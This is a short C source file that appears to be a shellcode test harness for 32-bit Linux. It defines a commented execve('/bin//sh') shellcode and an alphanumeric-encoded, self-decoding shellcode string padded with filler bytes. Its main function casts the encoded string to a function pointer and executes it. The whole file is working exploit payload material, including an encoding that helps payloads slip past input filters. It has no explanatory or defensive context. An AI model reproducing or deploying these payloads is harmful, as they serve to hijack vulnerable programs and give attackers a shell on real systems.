#include <stdio.h>
#include <string.h>

char shellcode[] =
                                // <_start>
    "\x31\xc9"                  // xor    %ecx,%ecx
    "\xf7\xe1"                  // mul    %ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\xcd\x80"                  // int    $0x80
;


char shellc[] = 
// nops here ..
"LLLLXPY3E01E01u03u0fXh8eshXf5VJPfhbifhDefXf5AJfPDTYhKATYX5KATY"
"PQTUX3H01H01X03X0YRX3E01E03U0Jfh2GfXf3E0f1E0f1U0fh88fX0E1f1E0f"
"3E0fPTRX49HHHQfPfYRX2E00E0BRX0E02E02L0z0L0zYRX4j4aGGGGGGGGGGGGG"
"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG"
"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG"
"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG"
"GGGGGGGGGGGGGGGG"; 

int main() {

    int (*f)() = (int(*)())shellc;
    printf("Length: %u\n", strlen(shellc));
    f();

}

